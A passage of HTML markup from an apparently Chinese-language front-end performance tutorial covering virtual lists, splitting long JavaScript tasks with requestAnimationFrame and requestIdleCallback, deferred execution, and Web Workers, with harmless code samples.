function">mutate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>\n  element<span class="token punctuation">.</span>style<span class="token punctuation">.</span>width <span class="token operator">=</span> width <span class="token operator">+</span> <span class="token string">\'px\'</span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>\n<h2 id="长列表优化"><a href="#%E9%95%BF%E5%88%97%E8%A1%A8%E4%BC%98%E5%8C%96" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>长列表优化</h2>\n<p>有些时候，你可能会需要在页面上展示一个包含上百个元素的列表（例如一个 Feed 流）。每个列表元素还有着复杂的内部结构，这显然提高了页面渲染的成本。甚至当你使用一些像 React 这样的库时，长列表的问题会被进一步放大。那么，有没有什么方法来优化长列表呢？</p>\n<h3 id="实现-virtual-list"><a href="#%E5%AE%9E%E7%8E%B0-virtual-list" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>实现 Virtual List</h3>\n<p>Virtual List 是一种用来优化长列表的技术。它可以保证在列表元素不断增加，或者列表元素很多的情况下，依然拥有很好的滚动、浏览性能。它的核心思想在于：只渲染可见区域附近的列表元素。下图左边就是 Virtual List 的效果，可以看到只有视口内和临近视口的上下区域内的元素会被渲染。</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-23-00-39-52-b384a8d5e2efcc16b50a094337e7710b-75fdb.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 56.25%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABY0lEQVQoz3WS2U7CQBSGff+nEFliYiAKN94ACi2ySBM1FFTawbZA99Id2mnrgSpbaHLm5vzzzfkyM1dFEkEVCLbc5zpTlfhWe4z2NJYKu/42IlGTlvqM0Z3qFNIrAy5PsGl0BavUQbkWWx+JioMXZqh7mNd9aKY7SiRiZUdywqUVmOuoQUu5FpOme5hpjETDj0Qbm+t4sTqG2Znqql4k29gLYpC6zoIlB1sAG+ewBrCDXYDpDBiERXvrNl+tj7V3MJad0A0zJtd3k+F4a3NBGyIlnZylrbkYbmXlR/MTbYQUV3WxZId2EDUvwk1atDeJ5sVemEjWQbtIsrzuWUFi+HEQJc9j+RQmUb7N1iienltvnPW5tOE9/8kt3J0qHzxE5mRh1Sjhps2W9u/8p9dBlQEPdf/Kl3s/h09CoMf3ZWuiwEzyS7mDiEDFMzjdB5UnUOGoCVXpc9Wh8DAUqpRw+zLbp7+pyyAY9Aq4YQAAAABJRU5ErkJggg==\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 23 00 39 52" title="" data-src="/static/2021-07-23-00-39-52-b384a8d5e2efcc16b50a094337e7710b-fee1c.png" data-srcset="/static/2021-07-23-00-39-52-b384a8d5e2efcc16b50a094337e7710b-a67b7.png 200w,\n/static/2021-07-23-00-39-52-b384a8d5e2efcc16b50a094337e7710b-0b187.png 400w,\n/static/2021-07-23-00-39-52-b384a8d5e2efcc16b50a094337e7710b-fee1c.png 800w,\n/static/2021-07-23-00-39-52-b384a8d5e2efcc16b50a094337e7710b-75fdb.png 880w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>不过这样带来的一个问题就是，由于只渲染固定 N 个元素，所以在页面滚动后，它们仍然留在原位。对于这个问题可以使用 <code class="language-text">position: absolute</code> 配合 <code class="language-text">transform: translate3d()</code> 来解决，手动设置展示元素的偏移量。</p>\n<p>其大致的实现思路如下：</p>\n<ol>\n<li>监听页面滚动（或者其他导致视口变化的事件）；</li>\n<li>滚动时根据滚动的距离计算需要展示的列表项；</li>\n<li>将列表项中展示的数据与组件替换成当前需要展示的内容；</li>\n<li>修改偏移量到对应的位置。</li>\n</ol>\n<p>这样还有一个好处，相当于是不断改变这 N 个元素的位置属性和内部的一些节点，不会有频繁的 DOM 创建与销毁，配合下面提到的 composite 可以获得不错的性能。</p>\n<p>如果你想要使用这项技术，除了自己实现外，一些常见的框架也有不错的开源实现。例如：</p>\n<ul>\n<li>基于 React 的 react-virtualized，它的开发者也在 dev.to 上分享了一些<a href="https://dev.to/nishanbajracharya/what-i-learned-from-building-my-own-virtualized-list-library-for-react-45ik" target="_blank" rel="nofollow noreferrer noopener">关于 virtual list 的内容</a>；</li>\n<li>基于 Vue 的 vue-virtual-scroll-list；</li>\n<li>基于 Angular 的 ngx-virtual-scroller；</li>\n</ul>\n<h3 id="原生的-virtual-scroller"><a href="#%E5%8E%9F%E7%94%9F%E7%9A%84-virtual-scroller" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>原生的 Virtual Scroller</h3>\n<p>Virtual List 在 feed 流、图片库等很多场景下非常有用，开源组件的下载量也说明了业务对这个功能的需求量。那么自然会想到，如果由浏览器层面来提供类似的能力，显然适用性会更强，性能可能也会更好。Virtual Scroller 就是上述逻辑的浏览器原生实现。Chrome Dev Summit 2018 上演示了它的效果。使用上也很简单：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="88248464139582320000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<script type=&quot;module&quot;>\n  import \'std:virtual-scroller\';\n</script>\n\n<virtual-scroller>\n  <div>item 1</div>\n  <div>item 2</div>\n  <div>item 3</div>\n  <div>item 4</div>\n  ……\n  <div>item 1000</div>\n</virtual-scroller>`, `88248464139582320000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="html"\n              >\n                <span class="gatsby-code-button-language">html</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>module<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">\n  <span class="token keyword">import</span> <span class="token string">\'std:virtual-scroller\'</span><span class="token punctuation">;</span>\n</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>\n\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>virtual-scroller</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>item 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>item 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>item 3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>item 4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>\n  ……\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>item 1000<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>virtual-scroller</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>注意，<code class="language-text">&lt;virtual-scroller&gt;</code> 是内置（built-in）模块提供的，所以需要从 std 中导入。目前（2019.08）还不建议在生产环境中使用该功能。如果想得到类似的效果还是建议使用基于 JavaScript 实现的库。当然，非常期待未来在生产环境中可以用上这个功能。</p>\n<p>想了解更多关于 Virtual Scroller 的信息可以看这里。</p>\n<h2 id="避免-javascript-运行时间过长"><a href="#%E9%81%BF%E5%85%8D-javascript-%E8%BF%90%E8%A1%8C%E6%97%B6%E9%97%B4%E8%BF%87%E9%95%BF" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>避免 JavaScript 运行时间过长</h2>\n<p>上面我们提到了，屏幕的刷新频率决定了每帧之间留给 JavaScript 执行的时间“并不多”。也正是由于渲染线程和 JavaScript 线程之间互斥，所以 JavaScript 执行占用时间过长会导致无法及时渲染，即出现所谓的“掉帧”。下面我们来看下如何避免 JavaScript 长时间执行而导致的掉帧。</p>\n<h3 id="任务分解"><a href="#%E4%BB%BB%E5%8A%A1%E5%88%86%E8%A7%A3" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>任务分解</h3>\n<p>你可以在 Chrome 控制台执行如下命令：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="41030904280552160000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`document.body.innerHTML = \'\';\nfor (var i = 0; i < 100; i++) {\n  1 + 1;\n}`, `41030904280552160000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js">document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">\'\'</span><span class="token punctuation">;</span>\n<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n  <span class="token number">1</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>可以看到页面被立即清空了。然后我们修改一下迭代的次数，从 100 次增加到 10 亿次：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="46009851237279370000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`document.body.innerHTML = \'\';\nfor (var i = 0; i < 1e9; i++) {\n  1 + 1;\n}`, `46009851237279370000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js">document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">\'\'</span><span class="token punctuation">;</span>\n<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">1e9</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n  <span class="token number">1</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>这时候运行你会发现页面没有变化，控制台也卡住了。过了几秒后页面被清空了。这是因为 JavaScript 的长时间执行阻塞了渲染线程。</p>\n<p>既然长时间的运行会导致渲染阻塞，那么最简单的方法就是把我们的任务拆成一个个持续时间更短的小任务，分散到各个帧中执行，例如改造成下面这样：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="72973626243768930000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`document.body.innerHTML = \'\';\n\nlet step = 0;\nfunction subtask() {\n  if (step === 1e9) {\n    return;\n  }\n  window.requestAnimationFrame(function() {\n    for (var i = 0; i < 1e8; i++) {\n      step++;\n      1 + 1;\n    }\n    subtask();\n  });\n}\nsubtask();`, `72973626243768930000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js">document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">\'\'</span><span class="token punctuation">;</span>\n\n<span class="token keyword">let</span> step <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>\n<span class="token keyword">function</span> <span class="token function">subtask</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n  <span class="token keyword">if</span> <span class="token punctuation">(</span>step <span class="token operator">===</span> <span class="token number">1e9</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n    <span class="token keyword">return</span><span class="token punctuation">;</span>\n  <span class="token punctuation">}</span>\n  window<span class="token punctuation">.</span><span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">1e8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n      step<span class="token operator">++</span><span class="token punctuation">;</span>\n      <span class="token number">1</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n    <span class="token function">subtask</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token punctuation">}</span>\n<span class="token function">subtask</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>我们把 10 亿次分散为十个 1 亿次的子任务，虽然同样执行了 10 亿次计算，但是页面迅速被清空了。</p>\n<p>此外，浏览器还有一个更强大的 API 来帮助你更精细地进行计算调度，它就是 requestIdleCallback。它会在浏览器“空闲”的时候执行注册的回调函数，避免在主线程“拥挤”的时候执行某些代码。它支持你设定一个超时参数，保证在超时后，即使仍然没有空闲时间也必须执行回调。回调函数会接收一个 IdleDeadline 类型的参数，你可以通过 .didTimeout 来查看是否是超时执行，还可以通过执行 .timeRemaining() 方法来查看剩余的空闲时间。</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="42772714584473310000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`window.requestIdleCallback(\n  (deadline) => {\n    if (deadline.timeRemaining() > 100) {\n      // 一些可以等浏览器空闲了再去做的事\n      // ……\n    }\n  },\n  { timeout: 5000 }\n);`, `42772714584473310000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js">window<span class="token punctuation">.</span><span class="token function">requestIdleCallback</span><span class="token punctuation">(</span>\n  <span class="token punctuation">(</span><span class="token parameter">deadline</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>\n    <span class="token keyword">if</span> <span class="token punctuation">(</span>deadline<span class="token punctuation">.</span><span class="token function">timeRemaining</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n      <span class="token comment">// 一些可以等浏览器空闲了再去做的事</span>\n      <span class="token comment">// ……</span>\n    <span class="token punctuation">}</span>\n  <span class="token punctuation">}</span><span class="token punctuation">,</span>\n  <span class="token punctuation">{</span> timeout<span class="token punctuation">:</span> <span class="token number">5000</span> <span class="token punctuation">}</span>\n<span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id="延迟执行"><a href="#%E5%BB%B6%E8%BF%9F%E6%89%A7%E8%A1%8C" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>延迟执行</h3>\n<p>一般来说，延迟执行分为两种策略：</p>\n<ul>\n<li>一种是懒执行，例如当我需要某个值时，我才去计算；</li>\n<li>第二种是延后执行，即利用 setTimeout、requestIdleCallback 这样的方法把计算放到后续的事件循环或空闲时刻。</li>\n</ul>\n<p>一些场景下，这两个都是可行的方法。除此以外，在 Idle Until Urgent 中作者介绍了一种改进的方法：把计算放到 requestIdleCallback 中，如果你一直不需要用到计算结果也没有关系，它会等到空闲时再执行，不影响性能；而当你要使用时，如果还未计算好则会立刻进行计算并返回结果，同时取消未执行的 requestIdleCallback。</p>\n<blockquote>\n<p>我们在这两部分都提及了 requestIdleCallback，它确实是个非常不错的 API，然而目前（2019.08）兼容性不是很乐观。如果你希望在生产环境中使用，建议使用 polyfill。</p>\n</blockquote>\n<h3 id="并行计算"><a href="#%E5%B9%B6%E8%A1%8C%E8%AE%A1%E7%AE%97" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>并行计算</h3>\n<p>对于一些 CPU 密集型的计算场景，除了在主 JavaScript 线程中拆分调度任务、异步执行之外，我们还可以考虑将计算与主线程并行。在浏览器中启用并行线程可以使用 Web Worker 中。在 Web Worker 标准出现之前，你能做的只是将任务异步化（asynchronously），而有了 Web Worker，你就可以并行（concurrency）地执行 JavaScript 了。</p>\n<p>下面提供了 Web Worker 的基本使用方式：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="77854085590266300000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`// index.js\nconst worker = new Worker(\'worker.js\');\n\nworker.addEventListener(\n  \'message\',\n  function(e) {\n    console.log(\\`result is \\${e.data}\\`);\n  },\n  false\n);\n\nworker.postMessage(\'start\');\n\n// worker.js\nself.addEventListener(\n  \'message\',\n  function(e) {\n    if (e.data === \'start\') {\n      // 一些密集的计算……\n      self.postMessage(result);\n    }\n  },\n  false\n);`, `77854085590266300000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token comment">// index.js</span>\n<span class="token keyword">const</span> worker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Worker</span><span class="token punctuation">(</span><span class="token string">\'worker.js\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\nworker<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>\n  <span class="token string">\'message\'</span><span class="token punctuation">,</span>\n  <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">result is </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>e<span class="token punctuation">.</span>data<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  <span class="token punctuation">}</span><span class="token punctuation">,</span>\n  <span class="token boolean">false</span>\n<span class="token punctuation">)</span><span class="token punctuation">;</span>\n\nworker<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">\'start\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n<span class="token comment">// worker.js</span>\nself<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>\n  <span class="token string">\'message\'</span><span class="token punctuation">,</span>\n  <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n    <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>data <span class="token operator">===</span> <span class="token string">\'start\'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n      <span class="token comment">// 一些密集的计算……</span>\n      self<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n  <span class="token punctuation">}</span><span class="token punctuation">,</span>\n  <span class="token boolean">false</span>\n<span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id="善用-composite"><a href="#%E5%96%84%E7%94%A8-composite" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>善用 Composite</h2>\n<p>Composite 这个概念和我们的渲染管线关系密切，可以看到它处于最后一步。</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-23-00-54-45-46e23a114177a5ebd5fe81223b1e351c-5fff1.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 15.279048490393413%; position: relative; bottom: 0; left: 0; background-image: 